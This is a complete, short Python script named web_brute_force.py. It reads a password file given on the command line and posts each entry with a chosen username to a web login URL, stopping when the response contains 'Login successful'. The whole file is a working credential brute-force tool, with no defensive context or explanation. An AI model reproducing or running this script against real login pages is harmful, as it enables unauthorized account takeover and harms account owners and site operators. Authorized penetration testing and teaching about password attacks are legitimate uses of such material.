import requests
import sys

def web_brute_force(url, username, password_list):
    for password in password_list:
        payload = {'username': username, 'password': password}
        response = requests.post(url, data=payload)
        
        if "Login successful" in response.text:
            print(f"Success: Password found - {password}")
            return True
        else:
            print(f"Failed: {password}")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python web_brute_force.py <url> <username> <password_file>")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    with open(password_file, 'r') as file:
        password_list = file.read().splitlines()

    web_brute_force(url, username, password_list)
